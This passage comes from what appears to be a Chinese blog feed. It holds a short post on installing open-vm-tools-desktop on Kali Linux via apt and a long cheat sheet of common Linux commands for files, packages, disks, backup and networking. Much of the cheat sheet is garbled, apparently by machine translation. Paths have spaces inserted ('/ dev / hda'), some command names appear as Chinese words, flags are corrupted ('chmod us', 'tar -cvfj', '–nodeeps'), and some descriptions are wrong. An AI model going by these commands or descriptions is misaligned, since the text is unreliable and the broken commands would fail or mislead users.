        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在kali Linux跟新到2018.2版本以后，使用虚拟机自带的vmtool进行安装</p><p>已经没有效果了，不能是屏幕适应客户端和拖拽操作，为此在网上搜了很多相关</p><p>的文档，最终找到了open-vm-tools-desktop 这个软件，下面来详细的介绍该</p><p>软件的安装</p><a id="more"></a><h1 id="0x01-配置跟新源"><a href="#0x01-配置跟新源" class="headerlink" title="0x01 配置跟新源"></a>0x01 配置跟新源</h1><p>在终端中输入：leafpad<br>/etc/apt/sources.list,然后添加以下跟新源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#中科大跟新源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"> </span><br><span class="line">#阿里云跟新源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><h1 id="0x02-跟新系统"><a href="#0x02-跟新系统" class="headerlink" title="0x02 跟新系统"></a>0x02 跟新系统</h1><p>终端输入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update <span class="comment">#跟新系统</span></span><br><span class="line">apt-get dist-upgrade <span class="comment">#跟新软件 （可自己选择操作）</span></span><br></pre></td></tr></table></figure><h1 id="0x03-安装vmtool"><a href="#0x03-安装vmtool" class="headerlink" title="0x03 安装vmtool"></a>0x03 安装vmtool</h1><p>终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install open-vm-tools-desktop fuse</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>在安装vmtools这个问题上，上网百度了好久，但是没有相关的信息，最后在一个论坛中看到了，没想到还真解决了，一条命令解决问题，真是太爽了，比传统的安装方式还要方便。总之，碰到问题以后多从百度，Google中搜集相关的信息，一般情况下，你碰到的问题都会有人碰到过，这样你就可以直接使用别人的间接经验了，不过也要有选择性的，现在的互联网时代，数据大爆炸，很多时候因为一个复制粘贴别人文章的文章而踩大坑，本人也最讨厌这种直接复制别人的文章还不注明出处的人，导致看文章的人走弯路。emmm，ok，就这样结束~</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>史上最全的Linux的常用命令</title>
      <link href="/2019/08/27/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E7%9A%84Linux%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/08/27/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E7%9A%84Linux%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文涵盖了Linux系统的很多命令，为了方便以后查找使用，在这里记录一下。</p><p>内容均从网上摘抄。</p><a id="more"></a><h1 id="0x01-系统信息"><a href="#0x01-系统信息" class="headerlink" title="0x01 系统信息"></a>0x01 系统信息</h1><p>arch显示机器的处理器架构（1）</p><p>uname -m显示机器的处理器架构（2）</p><p>uname -r显示正在使用的内核版本</p><p>dmidecode -q显示硬件系统部件 - （SMBIOS / DMI）</p><p>hdparm -i / dev / hda罗列一个磁盘的架构特性</p><p>hdparm -tT / dev / sda在磁盘上执行测试性读取操作</p><p>cat / proc / cpuinfo显示CPU信息的信息</p><p>cat / proc / interrupts显示中断</p><p>cat / proc / meminfo校验内存使用</p><p>cat / proc / swaps显示哪些swap被使用</p><p>cat / proc / version显示内核的版本</p><p>cat / proc / net / dev显示网络适配器及统计</p><p>cat / proc / mounts显示已加载的文件系统</p><p>lspci -tv罗列PCI设备</p><p>lsusb -tv显示USB设备</p><p>日期显示系统日期</p><p>cal 2007显示2007年的日历表</p><p>date 041217002007.00设置日期和时间 - 月日时分年。秒</p><p>clock -w将时间修改保存到BIOS</p><p>关系（系统的关机，重启以及登出）</p><p>shutdown -h now关闭系统（1）</p><p>init 0关闭系统（2）</p><p>telinit 0关闭系统（3）</p><p>shutdown -h hours：minutes＆按预定时间关闭系统</p><p>shutdown -c取消按预定时间关闭系统</p><p>shutdown -r now重启（1）</p><p>reboot重启（2）</p><p>注销注销</p><h1 id="0x02-文件和目录"><a href="#0x02-文件和目录" class="headerlink" title="0x02 文件和目录"></a>0x02 <strong>文件和目录</strong></h1><p>cd / home进入’/ home’目录’</p><p>cd ..返回上一级目录</p><p>cd ../ ..返回上两级目录</p><p>cd进入个人的主目录</p><p>cd~user1进入个人的主目录</p><p>cd - 返回上次所在的目录</p><p>pwd显示工作路径</p><p>ls查看目录中的文件</p><p>ls -F查看目录中的文件</p><p>ls -l显示文件和目录的详细资料</p><p>ls -a显示隐藏文件</p><p>ls * [0-9] *显示包含数字的文件名和目录名</p><p>tree显示文件和目录由根目录开始的树形结构（1）</p><p>lstree显示文件和目录由根目录开始的树形结构（2）</p><p>mkdir dir1创建一个叫做’dir1’的目录’</p><p>mkdir dir1 dir2同时创建两个目录</p><p>mkdir -p / tmp / dir1 / dir2创建一个目录树</p><p>rm -f file1删除一个叫做’file1’的文件’</p><p>rmdir dir1删除一个叫做’dir1’的目录’</p><p>rm -rf dir1删除一个叫做’dir1’的目录并同时删除其内容</p><p>rm -rf dir1 dir2同时删除两个目录及它们的内容</p><p>mv dir1 new_dir重命名/移动一个目录</p><p>cp file1 file2复制一个文件</p><p>cp目录/ *。复制一个目录下的所有文件到当前工作目录</p><p>cp -a / tmp / dir1。复制一个目录到当前工作目录</p><p>cp -a dir1 dir2复制一个目录</p><p>ln -s file1 lnk1创建一个指向文件或目录的软链接</p><p>ln file1 lnk1创建一个指向文件或目录的物理链接</p><p>touch -t 0712250000 file1修改一个文件或目录的时间戳 - （YYMMDDhhmm）</p><p>file file1将文件的mime类型输出为文本</p><p>iconv -l列出已知的编码</p><p>iconv -f fromEncoding -t toEncoding inputFile&gt; outputFile通过假设它在fromEncoding中编码并将其转换为toEncoding，从给定的输入文件创建一个新的。</p><p>找 。-maxdepth 1 -name * .jpg -print -exec convert“{}”-resize 80x60“thumbs / {}”; 批量调整当前目录中的文件大小并将它们发送到缩略图目录（需要从Imagemagick转换）</p><h1 id="0x03-文件搜索"><a href="#0x03-文件搜索" class="headerlink" title="0x03 文件搜索"></a>0x03 <strong>文件搜索</strong></h1><p>find / -name file1从’/‘开始进入根文件系统搜索文件和目录</p><p>find / -user user1搜索属于用户’user1’的文件和目录</p><p>find / home / user1 -name \ * .bin在目录’/ home / user1’中搜索带有’.bin’结尾的文件</p><p>find / usr / bin -type f -atime +100搜索在过去100天内未被使用过的的执行文件</p><p>find / usr / bin -type f -mtime -10搜索在10天内被创建或者修改过的文件</p><p>find / -name \ * .rpm -exec chmod 755’{}’; 搜索以’.rpm’结尾的文件并定义其权限</p><p>find / -xdev -name \ * .rpm搜索以’.rpm’结尾的文件，忽略光驱，捷盘等可移动设备</p><p>找到\ * .ps寻找以’.ps’结尾的文件 - 先运行’updatedb’命令</p><p>whereis halt显示一个二进制文件，源码或man的位置</p><p>停止显示一个二进制文件或可执行文件的完整路径</p><h1 id="0x04-挂载一个文件系统"><a href="#0x04-挂载一个文件系统" class="headerlink" title="0x04 挂载一个文件系统"></a>0x04 <strong>挂载一个文件系统</strong></h1><p>mount / dev / hda2 / mnt / hda2挂载一个叫做hda2的盘 - 确定目录’/ mnt / hda2’已经存在</p><p>umount / dev / hda2卸载一个叫做hda2的盘 - 先从挂载点’/ mnt / hda2’退出</p><p>fuser -km / mnt / hda2当设备繁忙时强制卸载</p><p>umount -n / mnt / hda2运行卸载操作而不写入/ etc / mtab文件 - 当文件为只读或当磁盘写满时非常有用</p><p>mount / dev / fd0 / mnt / floppy挂载一个软盘</p><p>mount / dev / cdrom / mnt / cdrom挂载一个cdrom或dvdrom</p><p>mount / dev / hdc / mnt / cdrecorder挂载一个cdrw或dvdrom</p><p>mount / dev / hdb / mnt / cdrecorder挂载一个cdrw或dvdrom</p><p>mount -o loop file.iso / mnt / cdrom挂载一个文件或ISO镜像文件</p><p>mount -t vfat / dev / hda5 / mnt / hda5挂载一个Windows FAT32文件系统</p><p>mount / dev / sda1 / mnt / usbdisk挂载一个usb捷盘或闪存设备</p><p>mount -t smbfs -o username = user，password = pass // WinClient / share / mnt / share挂载一个windows网络共享</p><h1 id="0x05-磁盘空间"><a href="#0x05-磁盘空间" class="headerlink" title="0x05 磁盘空间"></a>0x05 <strong>磁盘空间</strong></h1><p>df -h显示已经挂载的分区列表</p><p>ls -lSr | more以尺寸大小排列文件和目录</p><p>du -sh dir1估算目录’dir1’已经使用的磁盘空间’</p><p>du -sk * | sort -rn以容量大小为依据依次显示文件和目录的大小</p><p>rpm -q -a –qf’％10 {SIZE} t％{NAME} n’| sort -k1,1n以大小为依据依次显示已安装的rpm包所使用的空间（fedora，redhat类系统）</p><p>dpkg-query -W -f =’$ {Installed-Size; 10} t $ {Package} n’| sort -k1,1n以大小为依据显示已安装的deb包所使用的空间（ubuntu，debian类系统）</p><h1 id="0x06-用户和群组"><a href="#0x06-用户和群组" class="headerlink" title="0x06 用户和群组"></a>0x06 用户和群组</h1><p>groupadd group_name创建一个新用户组</p><p>groupdel group_name删除一个用户组</p><p>groupmod -n new_group_name old_group_name重命名一个用户组</p><p>useradd -c“名字姓氏”-g admin -d / home / user1 -s / bin / bash user1创建一个属于“admin”用户组的用户</p><p>useradd user1创建一个新用户</p><p>userdel -r user1删除一个用户（’-r’排除主目录）</p><p>usermod -c“用户FTP”-g system -d / ftp / user1 -s / bin / nologin user1修改用户属性</p><p>passwd修改口令</p><p>passwd user1修改一个用户的口令（只允许root执行）</p><p>chage -E 2005-12-31 user1设置用户口令的失效期限</p><p>pwck检查’/ etc / passwd’的文件格式和语法修正以及存在的用户</p><p>grpck检查’/ etc / passwd’的文件格式和语法修正以及存在的群组</p><p>newgrp group_name登陆进一个新的群组以改变新创建文件的预设群组</p><h1 id="0x07-文件的权限"><a href="#0x07-文件的权限" class="headerlink" title="0x07 文件的权限"></a>0x07 文件的权限</h1><blockquote><p>使用“+”设置权限，使用“ - ”用于取消</p></blockquote><p>ls -lh显示权限</p><p>ls / tmp | pr -T5 -W $ COLUMNS将终端划分成5栏显示</p><p>chmod ugo + rwx directory1设置目录的所有人（u），群组（g）以及其他人（o）以读（r），写（w）和执行（x）的权限</p><p>chmod go-rwx directory1删除群组（g）与其他人（o）对目录的读写执行权限</p><p>chown user1 file1改变一个文件的所有人属性</p><p>chown -R user1 directory1改变一个目录的所有人属性并同时改变改目录下所述文件的属性</p><p>chgrp group1 file1改变文件的群组</p><p>chown user1：group1 file1改变一个文件的所有人和群组属性</p><p>find / -perm -u + s罗列一个系统中所有使用了SUID控制的文件</p><p>chmod u + s / bin / file1设置一个二进制文件的SUID位 - 运行该文件的用户也被赋予和所有者同样的权限</p><p>chmod us / bin / file1禁用一个二进制文件的SUID位</p><p>chmod g + s / home / public设置一个目录的SGID位 - 类似SUID，不过这是针对目录的</p><p>chmod gs / home / public禁用一个目录的SGID位</p><p>chmod o + t / home / public设置一个文件的STIKY位 - 只允许合法所有人删除文件</p><p>chmod ot / home / public禁用一个目录的STIKY位</p><h1 id="0x08-文件的特殊属性"><a href="#0x08-文件的特殊属性" class="headerlink" title="0x08 文件的特殊属性"></a>0x08 文件的特殊属性</h1><blockquote><p>使用“+”设置权限，使用“ - ”用于取消</p></blockquote><p>chattr + a file1只允许以追加方式读写文件</p><p>chattr + c file1允许这个文件能被内核自动压缩/解压</p><p>chattr + d file1在进行文件系统备份时，dump程序将忽略这个文件</p><p>chattr + i file1设置成不可变的文件，不能被删除，修改，重命名或者链接</p><p>chattr + s file1允许一个文件被安全地删除</p><p>chattr + S file1一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘</p><p>chattr + u file1若文件被删除，系统会允许你在以后恢复这个被删除的文件</p><p>lsattr显示特殊的属性</p><h1 id="0x07-打包和压缩文件"><a href="#0x07-打包和压缩文件" class="headerlink" title="0x07 打包和压缩文件"></a>0x07 打包和压缩文件</h1><p>bunzip2 file1.bz2解压一个叫做’file1.bz2’的文件</p><p>bzip2 file1压缩一个叫做’file1’的文件</p><p>gunzip file1.gz解压一个叫做’file1.gz’的文件</p><p>gzip file1压缩一个叫做’file1’的文件</p><p>gzip -9 file1最大程度压缩</p><p>rar a file1.rar test_file创建一个叫做’file1.rar’的包</p><p>rar a file1.rar file1 file2 dir1同时压缩’file1’，’file2’以及目录’dir1’</p><p>rar x file1.rar解压rar包</p><p>unrar x file1.rar解压rar包</p><p>tar -cvf archive.tar file1创建一个非压缩的tarball</p><p>tar -cvf archive.tar file1 file2 dir1创建一个包含了’file1’，’file2’以及’dir1’的档案文件</p><p>tar -tf archive.tar显示一个包中的内容</p><p>tar -xvf archive.tar释放一个包</p><p>tar -xvf archive.tar -C / tmp将压缩包释放到/ tmp目录下</p><p>tar -cvfj archive.tar.bz2 dir1创建一个bzip2格式的压缩包</p><p>tar -xvfj archive.tar.bz2解压一个bzip2格式的压缩包</p><p>tar -cvfz archive.tar.gz dir1创建一个gzip格式的压缩包</p><p>tar -xvfz archive.tar.gz解压一个gzip格式的压缩包</p><p>zip file1.zip file1创建一个zip格式的压缩包</p><p>zip -r file1.zip file1 file2 dir1将几个文件和目录同时压缩成一个zip格式的压缩包</p><p>unzip<br>file1.zip解压一个zip格式压缩包</p><h1 id="0x08-RPM包-（Fedora，Redhat及类似系统）"><a href="#0x08-RPM包-（Fedora，Redhat及类似系统）" class="headerlink" title="0x08 RPM包 - （Fedora，Redhat及类似系统）"></a>0x08 RPM包 - （Fedora，Redhat及类似系统）</h1><p>rpm -ivh package.rpm安装一个rpm包</p><p>rpm -ivh –nodeeps package.rpm安装一个rpm包而忽略依赖关系警告</p><p>rpm -U package.rpm更新一个rpm包但不改变其配置文件</p><p>rpm -F package.rpm更新一个确定已经安装的rpm包</p><p>rpm -e package_name.rpm删除一个rpm包</p><p>rpm -qa显示系统中所有已经安装的rpm包</p><p>rpm -qa | grep httpd显示所有名称中包含“httpd”字样的rpm包</p><p>rpm -qi package_name获取一个已安装包的特殊信息</p><p>rpm -qg“System Environment / Daemons”显示一个组件的rpm包</p><p>rpm -ql package_name显示一个已经安装的rpm包提供的文件列表</p><p>rpm -qc package_name显示一个已经安装的rpm包提供的配置文件列表</p><p>rpm -q package_name –whatrequires显示与一个rpm包存在依赖关系的列表</p><p>rpm -q package_name –whatprovides显示一个rpm包所占的体积</p><p>rpm -q package_name –scripts显示在安装/删除期间所执行的脚本l</p><p>rpm -q package_name –changelog显示一个rpm包的修改历史</p><p>rpm -qf /etc/httpd/conf/httpd.conf确认所给的文件由哪个rpm包所提供</p><p>rpm -qp package.rpm -l显示由一个尚未安装的rpm包提供的文件列表</p><p>rpm –import / media / cdrom / RPM-GPG-KEY导入公司数字证书</p><p>rpm –checksig package.rpm确认一个rpm包的完整性</p><p>rpm -qa gpg-pubkey确认已安装的所有rpm包的完整性</p><p>rpm -V package_name检查文件尺寸，许可，类型，所有者，群组，MD5检查以及最后修改时间</p><p>rpm -Va检查系统中所有已安装的rpm包 - 小心使用</p><p>rpm -Vp package.rpm确认一个rpm包还未安装</p><p>rpm2cpio package.rpm | cpio –extract –make-directories * bin *从一个rpm包运行可执行文件</p><p>rpm -ivh /usr/src/redhat/RPMS/<code>arch</code>/package.rpm从一个rpm源码安装一个构建好的包</p><p>rpmbuild –rebuild package_name.src.rpm从一个rpm源码构建一个rpm包</p><h1 id="0x09-YUM软件包升级器-（Fedora，RedHat及类似系统）"><a href="#0x09-YUM软件包升级器-（Fedora，RedHat及类似系统）" class="headerlink" title="0x09 YUM软件包升级器 - （Fedora，RedHat及类似系统）"></a>0x09 YUM软件包升级器 - （Fedora，RedHat及类似系统）</h1><p>yum install package_name下载并安装一个rpm包</p><p>yum localinstall package_name.rpm将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系</p><p>yum update package_name.rpm更新当前系统中所有安装的rpm包</p><p>yum update package_name更新一个rpm包</p><p>yum remove package_name删除一个rpm包</p><p>yum list列出当前系统中安装的所有包</p><p>yum search package_name在rpm仓库中搜寻软件包</p><p>yum clean packages清理rpm缓存删除下载的包</p><p>yum clean headers删除所有头文件</p><p>yum clean all删除所有缓存的包和头文件</p><h1 id="0x10-DEB包（Debian，Ubuntu以及类似系统）"><a href="#0x10-DEB包（Debian，Ubuntu以及类似系统）" class="headerlink" title="0x10 DEB包（Debian，Ubuntu以及类似系统）"></a>0x10 DEB包（Debian，Ubuntu以及类似系统）</h1><p>dpkg -i package.deb安装/更新一个deb包</p><p>dpkg -r package_name从系统删除一个deb包</p><p>dpkg -l显示系统中所有已经安装的deb包</p><p>dpkg -l | grep httpd显示所有名称中包含“httpd”字样的deb包</p><p>dpkg -s package_name获得已经安装在系统中一个特殊包的信息</p><p>dpkg -L package_name显示系统中已经安装的一个deb包所提供的文件列表</p><p>dpkg –contents package.deb显示尚未安装的一个包所提供的文件列表</p><p>dpkg -S / bin / ping确认所给的文件由哪个deb包提供</p><h1 id="0x11-APT软件工具（Debian，Ubuntu以及类似系统）"><a href="#0x11-APT软件工具（Debian，Ubuntu以及类似系统）" class="headerlink" title="0x11 APT软件工具（Debian，Ubuntu以及类似系统）"></a>0x11 APT软件工具（Debian，Ubuntu以及类似系统）</h1><p>apt-get install package_name安装/更新一个deb包</p><p>apt-cdrom install package_name从光盘安装/更新一个deb包</p><p>apt-get update升级列表中的软件包</p><p>apt-get upgrade升级所有已安装的软件</p><p>apt-get remove package_name从系统删除一个deb包</p><p>apt-get check确认依赖的软件仓库正确</p><p>apt-get clean从下载的软件包中清理缓存</p><p>apt-cache search search-package返回包含所要搜索字符串的软件包名称</p><h1 id="0x12-查看文件内容"><a href="#0x12-查看文件内容" class="headerlink" title="0x12 查看文件内容"></a>0x12 查看文件内容</h1><p>cat file1从第一个字节开始正向查看文件的内容</p><p>tac file1从最后一行开始反向查看一个文件的内容</p><p>更多file1查看一个长文件的内容</p><p>less file1类似于’more’命令，但是它允许在文件中和正向操作一样的反向操作</p><p>head -2 file1查看一个文件的前两行</p><p>tail -2 file1查看一个文件的最后两行</p><p>tail -f / var / log / messages实时查看被添加到一个文件中的内容</p><h1 id="0x13-文本处理"><a href="#0x13-文本处理" class="headerlink" title="0x13 文本处理"></a>0x13 文本处理</h1><p>cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt使用PIPE，STDIN和STDOUT进行文本操作的一般语法</p><p>cat file1 | 命令（sed，grep，awk，grep等等）&gt; result.txt合并一个文件的详细说明文本，并将简介写入一个新文件中</p><p>cat file1 | 命令（sed，grep，awk，grep等等）&gt;&gt; result.txt合并一个文件的详细说明文本，并将简介写入一个已有的文件中</p><p>grep Aug / var / log / messages在文件’/ var / log / messages’中查找关键词“Aug”</p><p>grep ^ Aug / var / log / messages在文件’/ var / log / messages’中查找以“Aug”开始的词汇</p><p>grep [0-9] / var / log / messages选择’/ var / log / messages’文件中所有包含数字的行</p><p>grep Aug -R / var / log / *在目录’/ var / log’及随后的目录中搜索字符串“Aug”</p><p>sed’s / stringa1 / stringa2 / g’example.txt将example.txt文件中的“string1”替换成“string2”</p><p>sed’/ ^ $ / d’example.txt从example.txt文件中删除所有空白行</p><p>sed’/ *＃/ d; / ^ $ / d’example.txt从example.txt文件中删除所有注释和空白行</p><p>echo’esempio’| tr’[：lower：]’’[：upper：]’合并上下单元格内容</p><p>sed -e’1d’rend.txt从文件example.txt中排除第一行</p><p>sed -n’/ stringa1 / p’查看只包含词汇“string1”的行</p><p>sed -e’s / * $ //‘example.txt删除每一行最后的空白字符</p><p>sed -e’s / stringa1 // g’example.txt从文档中只删除词汇“string1”并保留剩余全部</p><p>sed -n’1,5p; 5q’example.txt查看从第一行到第5行内容</p><p>sed -n’5p; 5q’example.txt查看第5行</p><p>sed -e’s / 00 * / 0 / g’example.txt用单个零替换多个零</p><p>cat -n file1标示文件的行数</p><p>cat example.txt | awk’NR％2 == 1’删除example.txt文件中的所有偶数行</p><p>echo abc | awk’{print $ 1}’查看一行第一栏</p><p>echo abc | awk’{print $ 1，$ 3}’查看一行的第一和第三栏</p><p>paste file1 file2合并两个文件或两栏的内容</p><p>paste -d’+’file1 file2合并两个文件或两栏的内容，中间用“+”区分</p><p>sort file1 file2排序两个文件的内容</p><p>sort file1 file2 | uniq取出两个文件的并集（重复的行只保留一份）</p><p>sort file1 file2 | uniq -u删除交集，留下其他的行</p><p>sort file1 file2 | uniq -d取出两个文件的交集（只留下同时存在于两个文件中的文件）</p><p>comm -1 file1 file2比较两个文件的内容只删除’file1’所包含的内容</p><p>comm -2 file1 file2比较两个文件的内容只删除’file2’所包含的内容</p><p>comm -3 file1 file2比较两个文件的内容只删除两个文件共有的部分</p><h1 id="0x14-字符设置和文件格式转换"><a href="#0x14-字符设置和文件格式转换" class="headerlink" title="0x14 字符设置和文件格式转换"></a>0x14 字符设置和文件格式转换</h1><p>dos2unix filedos.txt fileunix.txt将一个文本文件的格式从MSDOS转换成UNIX</p><p>unix2dos fileunix.txt filedos.txt将一个文本文件的格式从UNIX转换成MSDOS</p><p>recode ..HTML &lt;page.txt&gt; page.html将一个文本文件转换成html</p><p>recode -l | 更多显示所有允许的转换格式</p><h1 id="0x15-文件系统分析"><a href="#0x15-文件系统分析" class="headerlink" title="0x15 文件系统分析"></a>0x15 <strong>文件系统分析</strong></h1><p>badblocks -v / dev / hda1检查磁盘hda1上的坏磁块</p><p>fsck / dev / hda1修复/检查hda1磁盘上linux文件系统的完整性</p><p>fsck.ext2 / dev / hda1修复/检查hda1磁盘上ext2文件系统的完整性</p><p>e2fsck / dev / hda1修复/检查hda1磁盘上ext2文件系统的完整性</p><p>e2fsck -j / dev / hda1修复/检查hda1磁盘上ext3文件系统的完整性</p><p>fsck.ext3 / dev / hda1修复/检查hda1磁盘上ext3文件系统的完整性</p><p>fsck.vfat / dev / hda1修复/检查hda1磁盘上fat文件系统的完整性</p><p>fsck.msdos / dev / hda1修复/检查hda1磁盘上dos文件系统的完整性</p><p>dosfsck / dev / hda1修复/检查hda1磁盘上dos文件系统的完整性</p><h1 id="0x16-初始化一个文件系统"><a href="#0x16-初始化一个文件系统" class="headerlink" title="0x16 初始化一个文件系统"></a>0x16 <strong>初始化一个文件系统</strong></h1><p>mkfs / dev / hda1在hda1分区创建一个文件系统</p><p>mke2fs / dev / hda1在hda1分区创建一个linux ext2的文件系统</p><p>mke2fs -j / dev / hda1在hda1分区创建一个linux ext3（日志型）的文件系统</p><p>mkfs -t vfat 32 -F / dev / hda1创建一个FAT32文件系统</p><p>fdformat -n / dev / fd0格式化一个软盘</p><p>mkswap / dev / hda3创建一个swap文件系统</p><p>返回顶部索引^</p><p>SWAP文件系统</p><p>mkswap / dev / hda3创建一个swap文件系统</p><p>swapon / dev / hda3启用一个新的swap文件系统</p><p>swapon / dev / hda2 / dev / hdb3启用两个交换分区</p><h1 id="0x17-备份"><a href="#0x17-备份" class="headerlink" title="0x17 备份"></a>0x17 <strong>备份</strong></h1><p>dump -0aj -f /tmp/home0.bak / home制作一个’/ home’目录的完整备份</p><p>dump -1aj -f /tmp/home0.bak / home制作一个’/ home’目录的交互式备份</p><p>恢复-if /tmp/home0.bak还原一个交互式备份</p><p>rsync -rogpav –delete / home / tmp同步两边的目录</p><p>rsync -rogpav -e ssh –delete / home ip_address：/ tmp通过SSH通道rsync</p><p>rsync -az -e ssh –delete ip_addr：/ home / public / home / local通过ssh和压缩将一个远程目录同步到本地目录</p><p>rsync -az -e ssh –delete / home / local ip_addr：/ home / public通过ssh和压缩将本地目录同步到远程目录</p><p>dd bs = 1M if = / dev / hda | gzip | ssh user @ ip_addr’dd of = hda.gz’通过ssh在远程主机上执行一次备份本地磁盘的操作</p><p>dd if = / dev / sda = / tmp / file1备份磁盘内容到一个文件</p><p>tar -Puf backup.tar / home / user执行一次对’/ home / user’目录的交互式备份操作</p><p>（cd / tmp / local / &amp;&amp; tar c。）| ssh -C user @ ip_addr’cd / home / share / &amp;&amp; tar x -p’通过ssh在远程目录中复制一个目录内容</p><p>（tar c / home）| ssh -C user @ ip_addr’cd / home / backup-home &amp;&amp; tar x -p’通过ssh在远程目录中复制一个本地目录</p><p>tar cf - 。| （cd / tmp / backup; tar xf - ）本地将一个目录复制到另一个地方，保留原有权限及链接</p><p>find / home / user1 -name’* .txt’| xargs cp -av –target-directory = / home / backup / –parents从一个目录查找并复制所有以’.txt’结尾的文件到另一个目录</p><p>find / var / log -name’* .log’| tar cv –files-from = - | bzip2&gt; log.tar.bz2查找所有以’.log’结尾的文件并做成一个bzip包</p><p>dd if = / dev / hda of = / dev / fd0 bs = 512 count = 1做一个将MBR（Master Boot Record）内容复制到软盘的动作</p><p>dd if = / dev / fd0 of = / dev / hda bs = 512 count = 1从已经保存到软盘的备份中恢复MBR内容</p><h1 id="0x18-光盘"><a href="#0x18-光盘" class="headerlink" title="0x18 光盘"></a>0x18 <strong>光盘</strong></h1><p>cdrecord -v gracetime = 2 dev = / dev / cdrom -eject blank = fast -force清空一个可复写的光盘内容</p><p>mkisofs / dev / cdrom&gt; cd.iso在磁盘上创建一个光盘的iso镜像文件</p><p>mkisofs / dev / cdrom | gzip&gt; cd_iso.gz在磁盘上创建一个压缩了的光盘iso镜像文件</p><p>mkisofs -J -allow-leading-dots -R -V“Label CD”-iso-level 4 -o ./cd.iso data_cd创建一个目录的iso镜像文件</p><p>cdrecord -v dev = / dev / cdrom cd.iso刻录一个ISO镜像文件</p><p>gzip -dc cd_iso.gz | cdrecord dev = / dev / cdrom - 刻录一个压缩了的ISO镜像文件</p><p>mount -o loop cd.iso / mnt / iso挂载一个ISO镜像文件</p><p>cd-paranoia -B从一个CD光盘转录音轨到wav文件中</p><p>cd-paranoia - “-3”从一个CD光盘转录音轨到wav文件中（参数-3）</p><p>cdrecord –scanbus扫描总线以识别scsi通道</p><p>dd if = / dev / hdc | md5sum校验一个设备的md5sum编码，例如一张CD</p><h1 id="0x19-网络-（以太网和WIFI无线）"><a href="#0x19-网络-（以太网和WIFI无线）" class="headerlink" title="0x19 网络 - （以太网和WIFI无线）"></a>0x19 <strong>网络 - （以太网和WIFI无线）</strong></h1><p>ifconfig eth0显示一个以太网卡的配置</p><p>ifup eth0启用一个’eth0’网络设备</p><p>ifdown eth0禁用一个’eth0’网络设备</p><p>ifconfig eth0 192.168.1.1 netmask 255.255.255.0控制IP地址</p><p>ifconfig eth0 promisc设置’eth0’成混杂模式以嗅探数据包（sniffing）</p><p>dhclient eth0以dhcp模式启用’eth0’</p><p>route -n show routing table</p><p>route add -net 0/0 gw IP_Gateway configura默认网关</p><p>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1配置静态路由到达网络’192.168.0.0/16’</p><p>route del 0/0 gw IP_gateway删除静态路由</p><p>echo“1”&gt; / proc / sys / net / ipv4 / ip_forward激活ip routing</p><p>hostname显示系统的主机名</p><p>主机<a href="http://www.example.com查找主机名将名称解析为IP地址，反之亦然（1）" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为IP地址，反之亦然（1）</a></p><p>nslookup <a href="http://www.example.com查找主机名将名称解析为ip地址，反之亦然（2）" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为ip地址，反之亦然（2）</a></p><p>ip link show显示所有接口的链接状态</p><p>mii-tool eth0显示’eth0’的链接状态</p><p>ethtool eth0显示网卡’eth0’的统计信息</p><p>netstat -tup显示所有活动网络连接及其PID</p><p>netstat -tupl显示监听系统及其PID的所有网络服务</p><p>tcpdump tcp端口80显示所有HTTP流量</p><p>iwlist扫描显示无线网络</p><p>iwconfig eth1显示无线网卡的配置</p><p>主机名显示主机名</p><p>托管<a href="http://www.example.com查找主机名，将名称解析为ip地址，反之亦然" target="_blank" rel="noopener">www.example.com查找主机名，将名称解析为ip地址，反之亦然</a></p><p>nslookup <a href="http://www.example.com查找主机名将名称解析为ip地址，反之亦然" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为ip地址，反之亦然</a></p><p>whois <a href="http://www.example.com查找Whois数据库" target="_blank" rel="noopener">www.example.com查找Whois数据库</a></p><p>GO TOP INDEX ^</p><p>Microsoft Windows网络（SAMBA）</p><p>nbtscan ip_addr netbios名称解析</p><p>nmblookup -A ip_addr netbios名称解析</p><p>smbclient -L ip_addr / hostname显示Windows主机的远程共享</p><p>smbget -Rr smb：// ip_addr / share像wget可以通过smb从主机窗口下载文件</p><p>mount -t smbfs -o username = user，password = pass // WinClient / share / mnt / share挂载一个windows网络共享</p><hr>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
